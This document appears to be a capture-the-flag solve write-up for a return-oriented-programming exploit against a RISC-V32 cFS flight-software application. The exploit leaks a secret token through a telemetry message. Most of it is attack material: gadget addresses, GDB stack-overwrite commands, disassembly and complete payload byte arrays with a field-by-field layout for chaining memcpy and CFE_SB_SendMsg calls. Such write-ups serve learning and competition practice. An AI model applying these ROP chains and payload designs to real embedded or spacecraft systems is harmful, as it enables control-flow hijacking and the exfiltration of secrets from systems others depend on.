# Solve 1 Explanation

Addresses are all dependent upon what has been compiled. `-exec` commands are for debugging sessions

## Notes on RISCV32 ROPPING
1. function prologues must be skipped, otherwise infinite loop
2. function calls are aligned by how much local space is reserved each function (multiples of 16) and may become misaligned 
3. fix 2 with a `align stack frame` gadget
4. the stack pointer (sp) is for return address
5. a second stack frame pointer (fp or s0) is used to make use of stack values/variables
6. the gadget for return is 3 instructions:

```c
    lw	ra,(x-4)(sp)
    //...
    addi	sp,sp,x
    ret
```
* x is multiple of 16
* `lw ra,` may not be located next to the rest of the instructions, which means there may be unavoidable consquences to a gagdet that must be taken into account

7. So far I haven't found how to move the sp besides function prologue/epilogue, but would necessary to make longer more complicated rop chains (esp with a limited buffer)
8. To prevent a crash following the stack frame up to a function which can be returned in to is possible, requires aligning the stack frames in 3


0x94901118 write_token function
0x94903320 token storage location
0x949033a4 ch string location

## Get token into memory
Call readTokenFile to load token in global variable `ch` 

1. -exec set {int}0x93f97c9c=0x949011b2	    // read file and store token in ch (readTokenFile+6)
2. -exec set {int}0x93f97cbc=0x692e7896 	// align stack frame
```c
[0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x3a,0x3b,0x3c,0x3d,0x3e,0x3f,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4a,0x4b,0xb2,0x11,0x90,0x94,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x96,0x78,0x2e,0x69]
```

```c
// Dump of assembler code for function readTokenFile:
   0x949011a0 <+0>:	addi	sp,sp,-32
   0x949011a2 <+2>:	sw	ra,28(sp)
   0x949011a4 <+4>:	sw	s0,24(sp)
   0x949011a6 <+6>:	addi	s0,sp,32                // START, to ensure we have the stack frame
   0x949011a8 <+8>:	auipc	a1,0x0
   //....
   0x94901218 <+120>:	nop
   0x9490121a <+122>:	lw	ra,28(sp)
   0x9490121c <+124>:	lw	s0,24(sp)
   0x9490121e <+126>:	addi	sp,sp,32
   0x94901220 <+128>:	ret
```
```c
-exec x/32wx $sp
0x93f97c70:	0x03720010	0x00000001	0x69303834	0x9490317c
0x93f97c80:	0x33323130	0x37363534	0x3b3a3938	0x3f3e3d3c  // START
0x93f97c90:	0x43424140	0x47464544	0x4b4a4948	0x949011a6  // c9c overwrite ra
0x93f97ca0:	0x53525150	0x57565554	0x5b5a5958	0x5f5e5d5c
0x93f97cb0:	0x63626160	0x67666564	0x6b6a6968	0x692e7896  // cbc overwrite follow on frame pointer - align to next stack frame
0x93f97cc0:	0x00001f50	0x00000002	0x93f97cf0	0x94900fa2  // ccc next return address for normal operation
0x93f97cd0:	0x0000000b	0x69303834	0x1f500002	0x00000000
0x93f97ce0:	0xfffff000	0x00000000	0x93f97d10	0x94900efc
```
```c
-exec x/4i 0x692e7896
   0x692e7896 <OS_Posix_ModuleAPI_Impl_Init+30>:	lw	ra,12(sp)
   0x692e7898 <OS_Posix_ModuleAPI_Impl_Init+32>:	lw	s0,8(sp)
   0x692e789a <OS_Posix_ModuleAPI_Impl_Init+34>:	addi	sp,sp,16
   0x692e789c <OS_Posix_ModuleAPI_Impl_Init+36>:	ret
```


## copy token into telemetry message struct
Memcpy token from global ch variable to token in struct for telemetry message
```c
typedef struct
{
   uint8   Header[CFE_SB_TLM_HDR_SIZE];
   uint8   token[MAX_STRLEN+1];
} ROP_APP_Token_Pkt;
```

1. -exec set {int}0x93f97c4c=0x40  		    // 64 - size
2. -exec set {int}0x93f97c48=0x949033a8	    // ch - source
3. -exec set {int}0x93f97c44=0x94903320	    // .token - destination
4. -exec set {int}0x93f97c98=0x93f97c9c	    // change frame pointer
5. -exec set {int}0x93f97c9c=0x692dc458	    // call memcpy
6. -exec set {int}0x93f97cbc=0x692e7896 	// align stack frame
```c
[0x40,0x00,0x00,0x00,0xa4,0x33,0x90,0x94,0x20,0x33,0x90,0x94,0x3c,0x3d,0x3e,0x3f,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x9c,0x7c,0xf9,0x93,0x58,0xc4,0x2d,0x69,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x96,0x78,0x2e,0x69]


0x93f97b70
0x94903314 <rop_app_Token_Pkt>:	0x00c06603	0x00004500	0x00000000	0x66647361
[0x0c,0x00,0x00,0x00,0xa0,0x7c,0xf9,0x93,0xa0,0x7f,0xf9,0x93,0x03,0x66,0xc0,0x00,0x00,0x45,0x00,0x00,0x00,0x00,0x00,0x00,0x9c,0x7c,0xf9,0x93,0x58,0xc4,0x2d,0x69,0x03,0x66,0xc0,0x00,0x00,0x45,0x00,0x00,0x00,0x00,0x00,0x00,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x96,0x78,0x2e,0x69]

[0x40,0x00,0x00,0x00,0xa4,0x33,0x90,0x94,0xac,0x7f,0xf9,0x93,0x03,0x66,0xc0,0x00,0x00,0x45,0x00,0x00,0x00,0x00,0x00,0x00,0x9c,0x7c,0xf9,0x93,0x58,0xc4,0x2d,0x69,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x96,0x78,0x2e,0x69]
```

[0x40,0x00,0x00,0x00,0x20,0x33,0x90,0x94,0xa0,0x7f,0xf9,0x93,0x3c,0x3d,0x3e,0x3f,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x9c,0x7c,0xf9,0x93,0x58,0xc4,0x2d,0x69,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x96,0x78,0x2e,0x69]


[0x14,0x33,0x90,0x94,0x34,0x35,0x36,0x37,0x38,0x39,0x3a,0x3b,0x3c,0x3d,0x3e,0x3f,0x9e,0x11,0x90,0x94,0x44,0x45,0x46,0x47,0xa4,0x7c,0xf9,0x93,0x7c,0x37,0x2e,0x69,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x96,0x78,0x2e,0x69]


[0xa0,0x7f,0xf9,0x93,0x34,0x35,0x36,0x37,0x38,0x39,0x3a,0x3b,0x3c,0x3d,0x3e,0x3f,0x9e,0x11,0x90,0x94,0x44,0x45,0x46,0x47,0xa4,0x7c,0xf9,0x93,0x7c,0x37,0x2e,0x69,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x96,0x78,0x2e,0x69]

0x94 90 11 9e = call to cfe_sb_sendmsg // should we just call it?
exec x/10i 0x69 2E 37 7C
   0x692e377c <OS_Timer_NoArgCallback+24>:	lw	a5,-20(s0)
   0x692e3780 <OS_Timer_NoArgCallback+28>:	lw	a0,-36(s0)
   0x692e3784 <OS_Timer_NoArgCallback+32>:	jalr	a5
   0x692e3786 <OS_Timer_NoArgCallback+34>:	nop
   0x692e3788 <OS_Timer_NoArgCallback+36>:	lw	ra,44(sp)
   0x692e378a <OS_Timer_NoArgCallback+38>:	lw	s0,40(sp)
   0x692e378c <OS_Timer_NoArgCallback+40>:	addi	sp,sp,48
   0x692e378e <OS_Timer_NoArgCallback+42>:	ret

this would allow changing a0 to the pointer to our constructed packet and a5 to the call to CFE_SB_SendMsg or just before it in a different function and then we would need to verify the return address is in the correct place to return to normal operation

then this version of the rop is done

```c
-exec x/10i 0x692dc458
   0x692dc458 <CFE_PSP_MemCpy+20>:	lw	a2,-28(s0)
   0x692dc45c <CFE_PSP_MemCpy+24>:	lw	a1,-24(s0)
   0x692dc460 <CFE_PSP_MemCpy+28>:	lw	a0,-20(s0)
   0x692dc464 <CFE_PSP_MemCpy+32>:	jal	ra,0x692b8da0 <memcpy@plt>
   0x692dc468 <CFE_PSP_MemCpy+36>:	li	a5,0
   0x692dc46a <CFE_PSP_MemCpy+38>:	mv	a0,a5
   0x692dc46c <CFE_PSP_MemCpy+40>:	lw	ra,28(sp)
   0x692dc46e <CFE_PSP_MemCpy+42>:	lw	s0,24(sp)
   0x692dc470 <CFE_PSP_MemCpy+44>:	addi	sp,sp,32
   0x692dc472 <CFE_PSP_MemCpy+46>:	ret
```
## send tlm message
1. -exec set {int}0x93f97c9c=0x9490118c	    // call ROP_APP_Send_Token function + 
2. -exec set {int}0x93f97cbc=0x692e7896 	// align stack frame
0x94901150
```c
[0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x3a,0x3b,0x3c,0x3d,0x3e,0x3f,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4a,0x4b,0x8c,0x11,0x90,0x94,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x96,0x78,0x2e,0x69]
```

```c
-exec disassemble ROP_APP_Send_Token
//Dump of assembler code for function ROP_APP_Send_Token:
   0x94901150 <+0>:	addi	sp,sp,-32
   0x94901152 <+2>:	sw	ra,28(sp)
   0x94901154 <+4>:	sw	s0,24(sp)
   0x94901156 <+6>:	addi	s0,sp,32
   // ...
   0x9490118c <+60>:	auipc	a0,0x2                // START, to ensure we skip the token overwrite
   0x94901190 <+64>:	lw	a0,-232(a0) # 0x949030a4
   0x94901194 <+68>:	jal	0x94900b00 <CFE_SB_TimeStampMsg@plt>
   0x94901196 <+70>:	auipc	a0,0x2
   0x9490119a <+74>:	lw	a0,-242(a0) # 0x949030a4
   0x9490119e <+78>:	jal	0x94900c00 <CFE_SB_SendMsg@plt>
   0x949011a0 <+80>:	li	a5,1
   0x949011a2 <+82>:	mv	a0,a5
   0x949011a4 <+84>:	lw	ra,28(sp)
   0x949011a6 <+86>:	lw	s0,24(sp)
   0x949011a8 <+88>:	addi	sp,sp,32
   0x949011aa <+90>:	ret
```


# Solve 2 Explanation
copy proper header for tlm message, with memcpy to scratch space

Scratch space `sp+0x300`
Stackptr = can be determined based off a static offset from the start where telescope.so is loaded in memory
* source is 12 bytes in provided buffer, otherwise find byte in memory to copy
* stackframeptr(fp/s0) moves to inside of buffer for size=>a0, src=>a1, dest=>a2

[size(4), source(4), destination(4), nothing(12), stackframeptr(4), return address(4), tlm_header(12), nothing(16), stackalignment(4) ]

size    = 0x0000000c
src     = 0x93f97ca0 (this in the message)
dest    = 0x93f97fa0 (sp + 0x300)
nothing = 0x41(4),0x42(4),0x43(4)

stackframeptr   = 0x93f97c9c (is 28bytes from the first argument to memcpy, in the message)
returnaddress   = 0x692dc458 (a call to memcpy, that includes putting arguments into a0,a1,a2)
tlm_header      = [0x03,0x66,0xc0,0x00, 0x00,0x45,0x00,0x00, 0x00,0x00,0x00,0x00]
nothing         = 0x50 - 0x6b
stackalignment  = 0x692e7896 (a function epilogue that realigns stack to return to normal operation)

[
    size: 0x0c,0x00,0x00,0x00,
    src:  0xa0,0x7c,0xf9,0x93,
    dest: 0xa0,0x7f,0xf9,0x93,
    NOTHING: 0x41,0x41,0x41,0x41,0x42,0x42,0x42,0x42,0x43,0x43,0x43,0x43,
    
    stackframeptr:  0x9c,0x7c,0xf9,0x93,
    returnaddress:  0x58,0xc4,0x2d,0x69,
    tlm_header:     0x03,0x66,0xc0,0x00,0x00,0x45,0x00,0x00,0x00,0x00,0x00,0x00,
    NOTHING:        0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,
    stackalignment: 0x96,0x78,0x2e,0x69]

```c
[0x0c,0x00,0x00,0x00,0xa0,0x7c,0xf9,0x93,0xa0,0x7f,0xf9,0x93,0x41,0x41,0x41,0x41,0x42,0x42,0x42,0x42,0x43,0x43,0x43,0x43,0x9c,0x7c,0xf9,0x93,0x58,0xc4,0x2d,0x69,0x03,0x66,0xc0,0x00,0x00,0x45,0x00,0x00,0x00,0x00,0x00,0x00,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x96,0x78,0x2e,0x69]
```

# Step 2
copy token into token message, with memcpy to scratch space +12bytes

* source is 64 bytes somewhere in memory, likely env?
* stackframeptr(fp/s0) moves to inside of buffer for size=>a0, src=>a1, dest=>a2

[size(4), source(4), destination(4), nothing(12), stackframeptr(4), returnaddress(4), nothing(28), stackalignment(4) ]

size    = 0x00000040
src     = 0x949033a4 (this is only because I have it there from a file read)
dest    = 0x93f97fac (sp + 0x300 + 0xc)
nothing = 0x41(4),0x42(4),0x43(4)

stackframeptr   = 0x93f97c9c (is 28bytes from the first argument to memcpy, in the message)
returnaddress   = 0x692dc458 (a call to memcpy, that includes putting arguments into a0,a1,a2)
nothing         = 0x50 - 0x6b
stackalignment  = 0x692e7896 (a function epilogue that realigns stack to return to normal operation)

```c
[0x40,0x00,0x00,0x00,0xa4,0x33,0x90,0x94,0xac,0x7f,0xf9,0x93,0x41,0x41,0x41,0x41,0x42,0x42,0x42,0x42,0x43,0x43,0x43,0x43,0x9c,0x7c,0xf9,0x93,0x58,0xc4,0x2d,0x69,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x96,0x78,0x2e,0x69]
```

# Step 3
call CFE_SB_SendMsg with scratch space as argument

[tlmsgptr(4), nothing(12), calltosendmsg(4), nothing(4), stackframeptr(4), returnaddress(4), nothing(28), stackalignment(4) ]

tlmmsgptr   = 0x93f97fa0 (scratch space on stack) - put into a0
nothing     = 0x34 - 0x3f
calltosendmsg   = 0x9490119e (CFE_SB_SendMsg) - put into a5
nothing     = 0x44 - 0x47

stackframeptr   = 0x93f97ca4 (is 36bytes from the first argument to memcpy, in the message)
returnaddress   = 0x692e377c (ropgadget to get an argument and call function in a5, then return)
```c
-exec x/10i 0x692e377c
   0x692e377c <OS_Timer_NoArgCallback+24>:	lw	a5,-20(s0)
   0x692e3780 <OS_Timer_NoArgCallback+28>:	lw	a0,-36(s0)
   0x692e3784 <OS_Timer_NoArgCallback+32>:	jalr	a5
   0x692e3786 <OS_Timer_NoArgCallback+34>:	nop
   0x692e3788 <OS_Timer_NoArgCallback+36>:	lw	ra,44(sp)
   0x692e378a <OS_Timer_NoArgCallback+38>:	lw	s0,40(sp)
   0x692e378c <OS_Timer_NoArgCallback+40>:	addi	sp,sp,48
   0x692e378e <OS_Timer_NoArgCallback+42>:	ret
```
nothing         = 0x50 - 0x6b
stackalignment  = 0x692e7896 (a function epilogue that realigns stack to return to normal operation)

```c
[0xa0,0x7f,0xf9,0x93,0x34,0x35,0x36,0x37,0x38,0x39,0x3a,0x3b,0x3c,0x3d,0x3e,0x3f,0x9e,0x11,0x90,0x94,0x44,0x45,0x46,0x47,0xa4,0x7c,0xf9,0x93,0x7c,0x37,0x2e,0x69,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x96,0x78,0x2e,0x69]
```

thinking ahead, could we just copy 4 bytes to the hk tlm message and see the output?

[
    size: 0x04,0x00,0x00,0x00,
    src:  0xa0,0x7c,0xf9,0x93,          /// wherever token +4bytes each loop
    dest: 0xa0,0x7f,0xf9,0x93,          // rop_app_Object.CmdMgr.ValidCmdCnt
    NOTHING: 0x41,0x41,0x41,0x41,0x42,0x42,0x42,0x42,0x43,0x43,0x43,0x43,
    
    stackframeptr:  0x9c,0x7c,0xf9,0x93,
    returnaddress:  0x58,0xc4,0x2d,0x69,
    NOTHING:        28 bytes
    stackalignment: 0x96,0x78,0x2e,0x69
]
